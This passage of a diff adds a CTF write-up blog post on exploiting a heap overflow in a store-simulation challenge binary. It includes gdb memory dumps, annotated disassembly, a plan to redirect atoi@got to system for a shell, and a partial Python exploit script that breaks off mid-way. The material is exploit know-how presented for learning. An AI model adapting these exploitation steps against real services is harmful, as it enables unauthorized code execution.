+</span><span class='line'>            <span class="n">v</span>
+</span><span class='line'><span class="mh">0x8a50ba8</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x41414100</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50bb8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50bc8</span><span class="p">:</span> <span class="mh">0x00414141</span>  <span class="mh">0x04b03741</span>  <span class="mh">0x41414108</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50bd8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50be8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50bf8</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50c08</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50c18</span><span class="p">:</span> <span class="mh">0x00414141</span>  <span class="mh">0x7fffffff</span>  <span class="mh">0x00000003</span>  <span class="mh">0x00000081</span>
+</span><span class='line'>            <span class="o">.--</span> <span class="n">normal</span> <span class="n">pointer</span>
+</span><span class='line'>            <span class="n">v</span>
+</span><span class='line'><span class="mh">0x8a50c28</span><span class="p">:</span> <span class="mh">0x08049b70</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x8a50c38</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I was ready to rock &amp; roll! I dumped in an address of a gadget, hoping to get code execution. There were, however, two small problems. First, the binary takes the pointer stored at the start of the item struct and then derefences it to get a second pointer to a function:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">;;;</span> <span class="n">triggered</span> <span class="n">when</span> <span class="n">asking</span> <span class="k">for</span> <span class="n">a</span> <span class="n">wholesale</span> <span class="n">price</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fdd</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">804897</span><span class="n">b</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x1ab</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">this</span> <span class="n">call</span> <span class="n">will</span> <span class="n">be</span> <span class="n">important</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">few</span> <span class="n">moments</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fe2</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">eax</span>                         <span class="p">;</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fe3</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">edx</span>                         <span class="p">;</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fe4</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esi</span><span class="p">]</span>         <span class="p">;</span> <span class="n">esi</span> <span class="ow">is</span> <span class="o">*</span><span class="n">item</span><span class="p">,</span> <span class="n">so</span> <span class="n">this</span> <span class="n">loads</span> <span class="mh">0x08049b70</span> <span class="n">into</span> <span class="n">eax</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fe6</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edi</span>                         <span class="p">;</span> <span class="nb">input</span> <span class="k">for</span> <span class="n">function</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fe7</span><span class="p">:</span> <span class="n">push</span>   <span class="n">esi</span>                         <span class="p">;</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">fe8</span><span class="p">:</span> <span class="n">call</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>             <span class="p">;</span> <span class="n">this</span> <span class="n">derefences</span> <span class="mh">0x08049b70</span><span class="p">,</span> <span class="n">effectively</span> <span class="n">calling</span> <span class="mh">0x08049466</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So I needed to have a pointer to a pointer on the heap. I had no way of leaking the heap address yet. I tried to overflow using the address of a got pointer so I could use <code>sprintf</code> to leak further information, but then the function at <code>0x8048fdd</code> reared its ugly head:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="p">;;</span> <span class="n">strange</span> <span class="n">function</span><span class="p">,</span> <span class="n">opens</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">zero</span><span class="p">,</span> <span class="n">tries</span> <span class="n">to</span> <span class="n">read</span> <span class="n">one</span> <span class="n">byte</span> <span class="ow">and</span> <span class="n">then</span> <span class="n">closes</span> <span class="n">it</span>
+</span><span class='line'> <span class="mi">804897</span><span class="n">b</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
+</span><span class='line'> <span class="mi">804897</span><span class="n">c</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+</span><span class='line'> <span class="mi">804897</span><span class="n">e</span><span class="p">:</span> <span class="n">push</span>   <span class="n">esi</span>
+</span><span class='line'> <span class="mi">804897</span><span class="n">f</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebx</span>
+</span><span class='line'> <span class="mi">8048980</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>
+</span><span class='line'> <span class="mi">8048981</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>
+</span><span class='line'> <span class="mi">8048982</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x0</span>
+</span><span class='line'> <span class="mi">8048984</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x80495ce</span>                 <span class="p">;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">zero</span>
+</span><span class='line'> <span class="mi">8048989</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
+</span><span class='line'> <span class="mi">804898</span><span class="n">c</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">80486</span><span class="n">d0</span> <span class="o">&lt;</span><span class="nb">open</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'> <span class="mi">8048991</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+</span><span class='line'> <span class="mi">8048994</span><span class="p">:</span> <span class="n">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+</span><span class='line'> <span class="mi">8048996</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span>
+</span><span class='line'> <span class="mi">8048998</span><span class="p">:</span> <span class="n">jns</span>    <span class="mi">80489</span><span class="n">a4</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x1d4</span><span class="o">&gt;</span>
+</span><span class='line'> <span class="mi">804899</span><span class="n">a</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+</span><span class='line'> <span class="mi">804899</span><span class="n">d</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x1</span>
+</span><span class='line'> <span class="mi">804899</span><span class="n">f</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">80487</span><span class="n">d0</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">a4</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">a5</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x1</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">a7</span><span class="p">:</span> <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esi</span><span class="p">]</span>           <span class="p">;</span> <span class="n">read</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span><span class="mh">0x8049b70</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">a9</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebx</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">aa</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">8048750</span> <span class="o">&lt;</span><span class="n">read</span><span class="nd">@plt</span><span class="o">&gt;</span>        <span class="p">;</span> <span class="n">read</span> <span class="n">one</span> <span class="n">byte</span> <span class="n">into</span> <span class="n">non</span><span class="o">-</span><span class="n">readable</span> <span class="nb">buffer</span><span class="p">,</span> <span class="n">huh</span><span class="err">?</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">af</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">b2</span><span class="p">:</span> <span class="n">dec</span>    <span class="n">eax</span>                       <span class="p">;</span> <span class="n">eax</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">of</span> <span class="n">course</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">b3</span><span class="p">:</span> <span class="n">je</span>     <span class="mi">804899</span><span class="n">a</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x1ca</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="k">if</span> <span class="n">eax</span> <span class="n">was</span> <span class="n">zero</span><span class="p">,</span> <span class="n">the</span> <span class="n">program</span> <span class="n">would</span> <span class="nb">exit</span><span class="p">()</span> <span class="o">--&gt;</span> <span class="n">protection</span> <span class="n">against</span> <span class="n">rwxp</span><span class="err">?</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">b5</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">ebx</span>   <span class="p">;</span> <span class="n">ebx</span> <span class="o">=</span> <span class="n">fd</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">b8</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">esp</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">bb</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">ebx</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">bc</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">esi</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">bd</span><span class="p">:</span> <span class="n">pop</span>    <span class="n">ebp</span>
+</span><span class='line'> <span class="mi">80489</span><span class="n">be</span><span class="p">:</span> <span class="n">jmp</span>    <span class="mi">8048790</span> <span class="o">&lt;</span><span class="n">close</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I didn&rsquo;t see it at first, until I overwrote the function pointer in the item struct with a got address. This address is readable and writeable. This function then tries to read a byte from <code>/dev/zero</code> into the function pointer. If it fails, no problem, execution will happily continue. If it succeeds, however, it will immediately halt execution of the binary. I was in trouble!</p>
+
+<p>I could not call imported functions from the got, nor could I just find any old gadget. Because of the dereferencing, the address of the gadget had to be present in the binary in a non-writeable section!</p>
+
+<p>Finally, I turned to a function that was already in the binary, used for watches:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">wx</span> <span class="mh">0x8049b60</span>
+</span><span class='line'><span class="mh">0x8049b60</span><span class="p">:</span> <span class="mh">0x0804935e</span>  <span class="mh">0x0804932e</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first function is called when asking for a wholesale price. However, the second function at <code>0x0804932e</code> is used in the generation of the store menu.</p>
+
+<h2>Tricky overflow</h2>
+
+<p>That function at <code>0x0804932e</code> looks like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="mi">804932</span><span class="n">e</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
+</span><span class='line'> <span class="mi">804932</span><span class="n">f</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+</span><span class='line'> <span class="mi">8049331</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+</span><span class='line'> <span class="mi">8049334</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
+</span><span class='line'> <span class="mi">8049337</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x24</span><span class="p">]</span>
+</span><span class='line'> <span class="mi">804933</span><span class="n">a</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>
+</span><span class='line'> <span class="mi">804933</span><span class="n">b</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">edx</span><span class="p">,[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>                   <span class="p">;</span> <span class="n">name</span>
+</span><span class='line'> <span class="mi">804933</span><span class="n">e</span><span class="p">:</span> <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x74</span><span class="p">]</span>            <span class="p">;</span> <span class="n">price</span>
+</span><span class='line'> <span class="mi">8049341</span><span class="p">:</span> <span class="n">push</span>   <span class="n">edx</span>                             <span class="p">;</span> <span class="n">description</span>
+</span><span class='line'> <span class="mi">8049342</span><span class="p">:</span> <span class="n">imul</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="mh">0x14</span>   <span class="p">;</span> <span class="nb">type</span> <span class="n">of</span> <span class="n">watch</span>
+</span><span class='line'> <span class="mi">8049346</span><span class="p">:</span> <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x804b140</span>
+</span><span class='line'> <span class="mi">804934</span><span class="n">b</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
+</span><span class='line'> <span class="mi">804934</span><span class="n">c</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x80495aa</span>                       <span class="p">;</span> <span class="n">format</span> <span class="n">string</span>
+</span><span class='line'> <span class="mi">8049351</span><span class="p">:</span> <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>             <span class="p">;</span> <span class="n">char</span> <span class="o">*</span><span class="nb">buffer</span><span class="p">:</span> <span class="n">ATTACKER</span><span class="o">-</span><span class="n">SUPPLIED</span><span class="err">!</span>
+</span><span class='line'> <span class="mi">8049354</span><span class="p">:</span> <span class="n">call</span>   <span class="mi">80486</span><span class="n">c0</span> <span class="o">&lt;</span><span class="n">sprintf</span><span class="nd">@plt</span><span class="o">&gt;</span>
+</span><span class='line'> <span class="mi">8049359</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
+</span><span class='line'> <span class="mi">804935</span><span class="n">c</span><span class="p">:</span> <span class="n">leave</span>
+</span><span class='line'> <span class="mi">804935</span><span class="n">d</span><span class="p">:</span> <span class="n">ret</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I chose to overwrite the function pointer in the item struct with  with <code>0x8049b64</code>. This causes the program to call <code>0x804932e</code> instead of the &lsquo;get wholesale price&rsquo;-function <strong>with an attacker supplied argument</strong>. This will allow me to overwrite a piece of memory with the generated string. If I set the description or name of an item correctly and I applied a correct offset, I could overwrite anything I want. There was some collateral damage to surrounding memory, however, making it impossible to overwrite a got pointer directly. The program contains another puzzle piece and I wanted to gain control over that instead.</p>
+
+<h2>Going for the big bucks</h2>
+
+<p>On the heap was an integer (or DWORD) that holds the amount of money that the simulated store customer has. The program substracts from this amount when a purchase is done, making it potentially a write-primitive. The <em>pointer</em> to this heap address lives at <code>0x804b280</code>. I wanted to overwrite this pointer with the address of <code>atoi@got</code>. Then, I would be able to update the pointer at <code>atoi@got</code>. Why <code>atoi</code>? Because it also uses one argument, just like <code>system</code>. If I could make <code>atoi</code> point to <code>system</code>, I had an easy way of spawning a shell. I modified the poc to do this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
+</span><span class='line'>  <span class="c">#s.connect((&#39;146.148.60.107&#39;, 6666))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># pause to allow gdb to attach</span>
+</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># register store</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;store?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># store name; maximum allowed, need it to overflow a buffer later!</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;S&quot;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span> 
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># the program *needs* to have an item to sell before it can generate a store menu</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># generate store menu. this will be 0xb20 bytes large, on the heap. </span>
+</span><span class='line'>  <span class="c"># overflow such that the store description will overwrite the second item&#39;s function pointer</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># second item</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
